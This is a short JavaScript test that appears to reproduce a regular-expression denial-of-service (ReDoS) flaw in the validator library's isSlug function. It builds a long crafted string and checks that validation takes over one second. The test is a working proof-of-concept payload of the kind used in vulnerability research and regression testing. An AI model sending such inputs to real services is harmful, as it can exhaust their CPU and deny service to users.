test("ReDos in validator", () => {
  function build_attack(n) {
    var ret = "111"
    for (var i = 0; i < n; i++) {
      ret += "a"
    }
  
    return ret+"_";
  }

  var validator = require("validator");
  const measureTime = require("../utils").measureTime;
  var attack_str = build_attack(40004);
  let t = measureTime(function () {
    validator.isSlug(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
